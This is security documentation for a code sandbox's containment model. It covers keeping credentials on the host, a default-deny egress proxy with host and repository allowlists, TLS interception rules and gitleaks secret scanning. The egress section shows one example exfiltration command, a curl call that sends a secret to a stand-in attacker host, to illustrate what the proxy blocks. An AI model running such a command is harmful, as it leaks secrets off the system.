# Security Model & Network Containment

The sandbox offers two **independent** guarantees. They are easy to conflate, so keep them distinct: one is always on and does not involve the egress proxy at all; the other is what the (opt-in) egress proxy adds.

---

## 1. Token Containment (Always On)

The sandbox container **never receives a VCS token.** There is no opt-in flag: credentials stay host-side. This is enforced by *how the write tools work*, not by the network layer — so it holds whether or not the egress proxy is enabled.

*   **Reads** (`sandbox_initialize(clone_repo=...)`, `pr=N`): A public clone needs no credentials; a private one has a host-resolved token handed to the proxy for a short read-authorization grant (this path does require the proxy). Either way, no token enters the container.
*   **Pushes / PRs** go through `publish`: It resolves a token host-side and hands it to the proxy for a short authorized push grant (push), or calls the GitHub API directly from the host (PR creation).
*   **Issue / comment writes** go through `sandbox_issue_write`, which calls the GitHub REST API host-side.
*   All output is automatically sanitized: Any token value is masked as `KEY=***` in stdout/stderr.

This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak.

---

## 2. Egress Containment (Egress Proxy)

The egress proxy is **enabled by default**. Set `SUNABA_ENABLE_EGRESS_PROXY=false` to opt out. 

When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. 

On top of that, the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:

*   **Where the sandbox may connect** — `SUNABA_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries; everything else is denied.
*   **Where the sandbox may write** — `SUNABA_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.

Use `allow_network=True` only when containers actually need network access. For the read/push grants to authenticate, the proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`).

### What each configuration guarantees

| Guarantee | Proxy **OFF** | Proxy **ON** (Default) |
|---|---|---|
| No token ever enters the container | ✅ (proxy-independent) | ✅ |
| Push restricted to an allowlist (network layer) | ❌ | ✅ (`SUNABA_ALLOWED_REPOS`) |
| Non-HTTP egress cut off (SSH / raw TCP / direct IP) | ❌ (`allow_network=True` is unrestricted) | ✅ (internal network, proxy is the only exit) |
| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`SUNABA_ALLOWED_EGRESS_HOSTS`, default-deny) |
| Private-repo read (`clone` / `pr=N`) | ❌ (anonymous clone only) | ✅ (read grant) |
| Fail-closed (network start refused if the proxy fails to start) | — | ✅ |

> [!IMPORTANT]
> **Who should turn the proxy off?** Almost nobody — which is why it is on by default. The case for the proxy is strongest exactly where this MCP is meant to be used: the sandbox runs code you do not fully trust (AI-generated, third-party dependencies, anything that could be prompt-injected) and you would rather it could not phone home. Turning it off (`SUNABA_ENABLE_EGRESS_PROXY=false`) is for the narrower cases where the containment is not worth its cost: a trusted CI runner, or a session that must reach a destination you cannot enumerate in advance. Token containment holds either way, so opting out costs you the *egress* boundary, not the credential boundary.

> [!WARNING]
> **What it does *not* guarantee.** Egress containment stops connections to *off-allowlist hosts*; it does not stop a determined exfil over an *allowlisted* channel (e.g. writing secrets into an issue on an allowed repo, or DNS/SNI side channels). It is a structural barrier against casual/arbitrary egress, not a complete information-flow boundary.

---

## 3. Configuring the Egress Proxy

### Push targets (`SUNABA_ALLOWED_REPOS`)
`SUNABA_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:

```bash
# Allow pushes to specific repositories
SUNABA_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
```

If `SUNABA_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup.

### Destination hosts (`SUNABA_ALLOWED_EGRESS_HOSTS`)
`SUNABA_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:

```bash
# Allow the sandbox to also reach an internal mirror and any *.example.com host
SUNABA_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
```

*   The built-in defaults — `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `proxy.golang.org`, `sum.golang.org`, `crates.io`, `static.crates.io`, `index.crates.io`, `static.rust-lang.org` — are **always** allowed so `git`, `pip`, `go`, `npm`, and `cargo` work out of the box; operator entries only *add* to them.
*   An entry beginning with `.` matches that domain and its subdomains (`.example.com` → both `example.com` and `a.example.com`).
*   The single value `*` disables destination-host containment entirely (any host passes), restoring the pre-containment passthrough behaviour for operators who need it.

### TLS interception, and which hosts are exempt (`SUNABA_PROXY_MITM_HOSTS`)

The proxy terminates TLS only where it has to. Two of its gates read the *decrypted* HTTP request — the git push gate (`git-receive-pack` is recognised from the request path) and the `api.github.com` write gate — so `github.com` and every `*.github.com` subdomain stay intercepted, and the sandbox trusts the proxy CA for them.

Every other allowlisted host carries no HTTP-level policy at all: only the destination-host check, which is enforced on the `CONNECT` request without decrypting anything. Those hosts are therefore **tunnelled untouched**, and the sandbox sees the origin's real certificate.

That is not only a purity argument. A client that ships its own root store — `rustls` + `webpki-roots` (e.g. `ureq`), a statically linked Go binary, a tool bundling `certifi` — never consults the system trust store, so the injected proxy CA is invisible to it and TLS fails even though the host is allowed. Interception broke that whole class of clients; passthrough fixes it without weakening containment (an off-allowlist host is still refused at `CONNECT`, with the same `403`).

```bash
# Keep an additional host intercepted (e.g. a self-hosted git server whose
# pushes should hit the git-push gate). Extends the built-in GitHub set.
SUNABA_PROXY_MITM_HOSTS="git.internal, .corp.example"
```

*   The built-in `*.github.com` entry can be extended but not removed.
*   The single caveat of passthrough: `EgressGuard.decide` never sees a tunnelled request, so its incidental refusal of `git-receive-pack` on *non-GitHub* git hosts no longer applies to them. If you allowlist a git host you also want push-gated, name it here.
*   With `SUNABA_ALLOWED_EGRESS_HOSTS="*"` (containment disabled) only the explicitly named hosts are tunnelled; anything unnamed keeps being intercepted, because there is no host set to enumerate.

### Applying changes
The proxy runs as a long-lived sidecar container (`sunaba-egress-proxy`) that reads these variables once, at its own startup. You do not need to restart or remove it by hand: the next `sandbox_initialize` or `publish` compares the sidecar's baked-in configuration against the current environment and recreates it when they differ. Recreation does not disturb running sandboxes — the proxy CA is persisted in a named volume and stays the same.

---

## 4. Secret Scan (Issue #676)

`publish` automatically scans manifest-declared files for potential secrets using `gitleaks` before pushing (it was Yelp's `detect-secrets` until #842). The scanner is baked into the base Docker image and runs inside the container; the suppression decision is made host-side.

**Configuration:**

*   `SUNABA_SECRETS_BASELINE` (default: `true`) — When enabled, `.secrets.baseline` **as committed on the base branch** suppresses known/approved findings across publishes.
*   **Override tool**: `secret_scan_override` is a separate MCP tool (not a `publish` argument). Call it when a publish is blocked (by either findings or a scan error). It authorises the current publish immediately, and appends the finding to the container's `.secrets.baseline` so it can be committed for future publishes.

`publish` proceeds only on an affirmative `clean` or `skipped` scan state; anything else — including a state it does not recognise — blocks.

> **See [`design_secret_scan.md`](design_secret_scan.md) for the design.** It is authoritative and carries the reasoning: the threat model, why no gitleaks-native baseline or ignore file is used, why the suppression list is resolved host-side rather than read from the container, the known gaps, and the alternatives that were considered and rejected. Do not change the scan's behaviour without reading it — several of its decisions look wrong at a glance and are not.
